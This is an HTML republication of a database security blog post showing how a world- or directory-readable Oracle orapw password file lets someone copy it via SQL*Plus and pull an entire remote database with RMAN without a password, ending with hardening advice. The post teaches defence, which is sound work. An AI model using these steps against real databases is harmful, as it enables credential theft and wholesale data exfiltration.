@@ -1,0 +1,166 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="canonical" href="https://www.dbi-services.com/blog/keep-your-orapw-password-file-secure/">
+<title>Keep your orapw password file secure</title>
+<link rel="stylesheet" href="../../../style.css">
+</head>
+<body>
+<p class="firstpub">This was first published on <a href="https://www.dbi-services.com/blog/keep-your-orapw-password-file-secure/">https://www.dbi-services.com/blog/keep-your-orapw-password-file-secure/</a> (2018-01-05)<br>Republishing here for new followers. The content is related to the versions available at the publication date.</p>
+<h1 class="entry-title">Keep your orapw password file secure</h1>
+<div class="content-inner">
+<h2>By Franck Pachot</h2>
+<p>.<br />
+This is a small demo I did when I&#8217;ve found a database password file (orapw) lying around in /tmp with -rw-rw-rw- permissions, to show how this is a bad idea. People think that the orapw file only contains hashes to validate a password given, and forget that it can be used to connect to a remote database without password.<br />
+<!--more--><br />
+I can easily imagine why the orapwd was there in /tmp. To build a standby database, you need to copy the password file to the standby server. If you don&#8217;t have direct access to the oracle user, but only a sudo access for &#8216;security reasons&#8217;, you can&#8217;t scp easily. Then you copy the file to /tmp, make it readable by all users, and you can scp with your user.</p>
+<p>In this demo I don&#8217;t even have access to the host. I&#8217;ve only access to connect to a PDB with the SCOTT users, reated with utlsampl.sql, with those additional privileges, a read access on $ORACLE_HOME/dbs:</p>
+<pre><code>
+SQL&gt; connect sys/oracle@//192.168.56.122/PDB1 as sysdba
+Connected.
+&nbsp;
+SQL&gt; create or replace directory DBS as '/u01/app/oracle/product/12.2.0/dbhome_1/dbs';
+Directory DBS created.
+&nbsp;
+SQL&gt; grant read on directory DBS to SCOTT;
+Grant succeeded.
+</code></pre>
+<p>People tend to grant many privileges, and think that a read access on a directory which is supposed to contain only configuration files is harmless. Let&#8217;s see what you can do from another server.</p>
+<h3>Get the orapw file from a remote connection</h3>
+<p>I connect with SCOTT which can read from ORACLE_HOME/dbs:</p>
+<pre><code>
+SQL&gt; connect scott/tiger@//192.168.56.122/PDB1
+Connected.
+&nbsp;
+SQL&gt; show user
+USER is "SCOTT"
+&nbsp;
+SQL&gt; select * from all_directories;
+&nbsp;
+OWNER   DIRECTORY_NAME   DIRECTORY_PATH                                  ORIGIN_CON_ID
+-----   --------------   --------------                                  -------------
+SYS     DBS              /u01/app/oracle/product/12.2.0/dbhome_1/dbs                 4
+</code></pre>
+<p>I create a table to read this file (other possibilities utl_tile, external tables,&#8230;):</p>
+<pre><code>
+SQL&gt; create table DEMO ( b blob );
+Table DEMO created.
+&nbsp;
+SQL&gt; insert into demo values ( bfilename('DBS','orapwCDB1') );
+1 row inserted.
+</code></pre>
+<p>I&#8217;m on another server with the same version of Oracle Database software installed.</p>
+<p>I use sqlplus to retrieve the server file to my client:</p>
+<pre><code>
+sqlplus -s scott/tiger@//192.168.56.122/PDB1 &lt;&lt;EOF |xxd -p -r &gt; $ORACLE_HOME/dbs/orapwCDB1
+set pages 0 lin 17000 long 1000000000 longc 16384
+select * from DEMO;
+exit
+EOF
+</code></pre>
+<p>This (documented by <a href="https://laurentschneider.com/wordpress/2014/10/select-pdf-from-sqlplus.html" target="_blank" rel="noopener noreferrer">Laurent Schneider</a>) uses sqlplus to display the BLOB variable as hexadecimal code and xdd (installed with vim-common) to revert it to binary.</p>
+<p>So, on my server I have a copy of the database password file for the database I want to steal:</p>
+<pre><code>
+[oracle@VM122 ~]$ strings /u01/app/oracle/product/12.2.0/dbhome_1/dbs/orapwCDB1
+&nbsp;
+ORACLE Remote Password file
+X)l)|
+SYSDG
++933k
+SYSBACKUP
+f       ts6 $9
+SYSKM
+</code></pre>
+<h3>Pull</h3>
+<p>A nice feature of 12<i>c</i> is the ability to pull backups from a service. With this, it is the destination that connects to the source. I have diagrams to explain <a href="https://www.dbi-services.com/blog/rman-12c-push-and-pull-duplicate-explained/" target="_blank" rel="noopener noreferrer">here</a>). It is an easy alternative to RMAN DUPLICATE (see MOS <a href="https://support.oracle.com/epmos/faces/DocContentDisplay?id=2283978.1" target="_blank" rel="noopener noreferrer">Doc ID 2283978.1 Creating a Physical Standby database using RMAN restore from service</a>). And one difference is that you don&#8217;t have to provide the password:</p>
+<p>I prepare a small init.ora and directory for the datafiles</p>
+<pre><code>
+echo "db_name=CDB1" &gt; $ORACLE_HOME/dbs/initCDB1.ora
+&nbsp;
+mkdir -p /u01/oradata/CDB1
+</code></pre>
+<p>I&#8217;m still on my server with the copy of the remote orapw file and a network access to the source database and I just restore it, without the need for a password:</p>
+<pre><code>
+RMAN&gt; connect target /
+connected to target database (not started)
+</code></pre>
+<p>I start a local instance:</p>
+<pre><code>
+RMAN&gt; startup nomount force
+Oracle instance started
+&nbsp;
+Total System Global Area     859832320 bytes
+Fixed Size                     8798552 bytes
+Variable Size                784338600 bytes
+Database Buffers              58720256 bytes
+Redo Buffers                   7974912 bytes
+</code></pre>
+<p>I restore the controlfile:</p>
+<pre><code>
+RMAN&gt; restore controlfile from service '//192.168.56.122/CDB1';
+Starting restore at 05-JAN-18
+using target database control file instead of recovery catalog
+allocated channel: ORA_DISK_1
+channel ORA_DISK_1: SID=262 device type=DISK
+channel ORA_DISK_1: starting datafile backup set restore
+channel ORA_DISK_1: using network backup set from service //192.168.56.122/CDB1
+channel ORA_DISK_1: restoring control file
+channel ORA_DISK_1: restore complete, elapsed time: 00:00:02
+output file name=/u01/oradata/CDB1/control01.ctl
+output file name=/u01/fast_recovery_area/CDB1/control02.ctl
+Finished restore at 05-JAN-18
+</code></pre>
+<p>That&#8217;s the interesting part because it has to be connected, at least as SYSOPER, to the source database but I didn&#8217;t provide any password.</p>
+<p>I mount this controlfile locally:</p>
+<pre><code>
+RMAN&gt; alter database mount;
+Statement processed
+&nbsp;
+released channel: ORA_DISK_1
+</code></pre>
+<p>And now it is easy to pull the whole database (the CDB with all its PDBs) to my local server:</p>
+<pre><code>
+RMAN&gt; restore database from service '//192.168.56.122/CDB1';
+Starting restore at 05-JAN-18
+Starting implicit crosscheck backup at 05-JAN-18
+allocated channel: ORA_DISK_1
+channel ORA_DISK_1: SID=262 device type=DISK
+Crosschecked 6 objects
+Finished implicit crosscheck backup at 05-JAN-18
+Starting implicit crosscheck copy at 05-JAN-18
+using channel ORA_DISK_1
+Finished implicit crosscheck copy at 05-JAN-18
+searching for all files in the recovery area
+cataloging files...
+cataloging done
+&nbsp;
+List of Cataloged Files
+=======================
+File Name: /u01/fast_recovery_area/CDB1/autobackup/2018_01_04/o1_mf_s_964524009_f4vzyt59_.bkp
+File Name: /u01/fast_recovery_area/CDB1/archivelog/2018_01_04/o1_mf_1_15_f4w5vv19_.arc
+File Name: /u01/fast_recovery_area/CDB1/archivelog/2018_01_04/o1_mf_1_16_f4wmm0t8_.arc
+File Name: /u01/fast_recovery_area/CDB1/archivelog/2018_01_04/o1_mf_1_14_f4vzjdl1_.arc
+using channel ORA_DISK_1
+channel ORA_DISK_1: starting datafile backup set restore
+channel ORA_DISK_1: using network backup set from service //192.168.56.122/CDB1
+channel ORA_DISK_1: specifying datafile(s) to restore from backup set
+channel ORA_DISK_1: restoring datafile 00001 to /u01/oradata/CDB1/system01.dbf
+channel ORA_DISK_1: restore complete, elapsed time: 00:00:16
+channel ORA_DISK_1: starting datafile backup set restore
+...
+</code></pre>
+<h3>So what?</h3>
+<p>This is not an issue and is totally expected. In a Data Guard configuration, the primary and standby database have to communicate with each others and then need a passwordless authentication. This is done with the password file, and this is the reason why you need to copy it rather than just create another one with the same passwords.</p>
+<p>So, there is more than just a hash of the password (which is required to validate a password) and probably includes a key (randomly generated when you create the password file) used for passwordless authentication.</p>
+<p>Then, be careful, and do not give read access to the orapw files. You must secure them in the same way as a ssh key or an encryption wallet. and this include:</p>
+<ul>
+<li>Do not leave a copy of the orapw file in a shared location</li>
+<li>Be careful with grants on directories, even in READ</li>
+<li>Do not grant CREATE ANY DIRECTORY except for a PDB with PATH_PREFIX lockdown</li>
+</ul>
+
+</div>
+</body>
+</html>
